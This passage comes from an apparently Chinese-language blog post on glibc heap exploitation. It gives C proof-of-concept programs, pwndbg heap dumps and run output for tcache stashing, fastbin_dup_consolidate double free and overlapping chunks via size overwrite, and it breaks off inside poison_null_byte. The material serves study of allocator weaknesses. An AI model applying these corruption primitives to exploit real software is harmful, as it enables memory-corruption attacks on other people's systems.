chunk2 will be put into unsorted bin.</span><br><span class="line"></span><br><span class="line">Now we alloc a chunk larger than <span class="number">0x90</span> to put chunk0 and chunk2 into small bin.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">malloc</span> two chunks to spare space <span class="keyword">for</span> small bins. After that, we now have <span class="number">5</span> tcache bins and <span class="number">2</span> small bins</span><br><span class="line"></span><br><span class="line">Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: <span class="number">0x7fffffffdca0</span>.</span><br><span class="line"></span><br><span class="line">Finally we alloc a <span class="number">0x90</span> chunk with <span class="built_in">calloc</span> to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><br><span class="line"></span><br><span class="line">Now our fake chunk has been put into tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span>. Its fd pointer now point to next <span class="built_in">free</span> chunk: <span class="number">0x55555555b3a0</span> and the bck-&gt;fd has been changed into a libc addr: <span class="number">0x7ffff7dcfd30</span></span><br><span class="line"></span><br><span class="line">As you can see, next <span class="built_in">malloc</span>(<span class="number">0x90</span>) will <span class="keyword">return</span> the region our fake chunk: <span class="number">0x7fffffffdcb0</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"This is a powerful technique that bypasses the double free check in tcachebin."</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up the tcache list to force the fastbin usage...\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocate another chunk of the same size p1=%p \n"</span>, p1);</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">"Freeing p1 will add this chunk to the fastbin list...\n\n"</span>);</span><br><span class="line">  	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  	<span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating a tcache-sized chunk (p3=%p)\n"</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"will trigger the malloc_consolidate and merge\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"the fastbin chunks into the top chunk, thus\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p1 and p3 are now pointing to the same chunk !\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">"Triggering the double free vulnerability!\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	assert(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The double free added the chunk referenced by p1 \n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"to the tcache thus the next similar-size malloc will\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"point to p3: p3=%p, p4=%p\n\n"</span>,p3, p4);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个就是用的consolidate的特性和2.23下的相似。第一步填满tcache，然后利用calloc p1申请一个0x40(不会从tcache中取)，free掉p1，此时p1进入fastbin中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x55555555b850</span> —▸ <span class="number">0x55555555b800</span> —▸ <span class="number">0x55555555b7b0</span> —▸ <span class="number">0x55555555b760</span> —▸ <span class="number">0x55555555b710</span> —▸ <span class="number">0x55555555b6c0</span> —▸ <span class="number">0x55555555b670</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55555555b890</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>malloc 一个大于smallbin大小的chunk，此时会发生堆合并，p1和p3被合并了。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b890</span></span><br><span class="line">Size: <span class="number">0x411</span></span><br></pre></td></tr></tbody></table></figure>

<p>释放p1，因为此时p1的inuse位还是为1可以被释放，tcache bin中出现了0x411并申请0x400大小的chunk(p4)，此时p4=p3</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">This is a powerful technique that bypasses the <span class="type">double</span> <span class="built_in">free</span> check in tcachebin.</span><br><span class="line">Fill up the tcache <span class="built_in">list</span> to force the fastbin usage...</span><br><span class="line">Allocate another chunk of the same size p1=<span class="number">0x55555555b8a0</span> </span><br><span class="line">Freeing p1 will add this chunk to the fastbin <span class="built_in">list</span>...</span><br><span class="line"></span><br><span class="line">Allocating a tcache-sized chunk (p3=<span class="number">0x55555555b8a0</span>)</span><br><span class="line">will trigger the malloc_consolidate and merge</span><br><span class="line">the fastbin chunks into the top chunk, thus</span><br><span class="line">p1 and p3 are now pointing to the same chunk !</span><br><span class="line"></span><br><span class="line">Triggering the <span class="type">double</span> <span class="built_in">free</span> vulnerability!</span><br><span class="line"></span><br><span class="line">The <span class="type">double</span> <span class="built_in">free</span> added the chunk referenced by p1 </span><br><span class="line">to the tcache thus the next similar-size <span class="built_in">malloc</span> will</span><br><span class="line">point to p3: p3=<span class="number">0x55555555b8a0</span>, p4=<span class="number">0x55555555b8a0</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line">		<span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line">		<span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">	       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">	       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line">		<span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>((<span class="type">char</span> *)p4, (<span class="type">char</span> *)p3));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>堆块重叠的利用，首先创建了三个堆块(p1, p2, p3)。然后释放p2，因为p2是0x501，所以会进入unsortedbin中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x501</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b750</span><br><span class="line">Size: 0x501</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555bc50</span><br><span class="line">Size: 0x80</span><br></pre></td></tr></tbody></table></figure>

<p>现在假设有一个漏洞可以改p2size为0x581，可以看到p3已经被包进来了。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x501</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b750</span><br><span class="line">Size: 0x581</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br></pre></td></tr></tbody></table></figure>

<p>然后申请p4的大小为0x578这个时候p4包含了p2和p3。利用p4就可以对p2和p3进行修改。</p>
<p>运行结果：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let<span class="number">'</span>s start to allocate <span class="number">3</span> chunks on the heap</span><br><span class="line">The <span class="number">3</span> chunks have been allocated here:</span><br><span class="line">p1=<span class="number">0x55555555b260</span></span><br><span class="line">p2=<span class="number">0x55555555b760</span></span><br><span class="line">p3=<span class="number">0x55555555bc60</span></span><br><span class="line"></span><br><span class="line">Now let<span class="number">'</span>s <span class="built_in">free</span> the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new <span class="built_in">malloc</span>() of its size</span><br><span class="line">Now let<span class="number">'</span>s simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last <span class="number">3</span> bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as <span class="number">1</span> (prev_inuse), to assure that p1 is not mistaken <span class="keyword">for</span> a <span class="built_in">free</span> chunk.</span><br><span class="line">We are going to <span class="built_in">set</span> the size of chunk p2 to to <span class="number">1409</span>, which gives us</span><br><span class="line">a region size of <span class="number">1400</span></span><br><span class="line"></span><br><span class="line">Now let<span class="number">'</span>s allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This <span class="built_in">malloc</span> will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at <span class="number">0x55555555b760</span> and ends at <span class="number">0x55555555bcd8</span></span><br><span class="line">p3 starts at <span class="number">0x55555555bc60</span> and ends at <span class="number">0x55555555c1d8</span></span><br><span class="line">p4 should overlap with p3, in this <span class="keyword">case</span> p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let<span class="number">'</span>s run through an example. Right now, we have:</span><br><span class="line">p4 = �����</span><br><span class="line">p3 = <span class="number">3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331</span></span><br><span class="line"></span><br><span class="line">If we <span class="built_in">memset</span>(p4, <span class="string">'4'</span>, <span class="number">1400</span>), we have:</span><br><span class="line">p4 = <span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441</span></span><br><span class="line">p3 = <span class="number">4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441</span></span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> we then <span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>), we have:</span><br><span class="line">p4 = <span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444443333333333333333333333333333333333333333333333333333333333333333333333333333333344444444444444444444444444444444444444441</span></span><br><span class="line">p3 = <span class="number">3333333333333333333333333333333333333333333333333333333333333333333333333333333344444444444444444444444444444444444444441</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="poison-null-byte-off-by-null-1"><a href="#poison-null-byte-off-by-null-1" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 18.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* 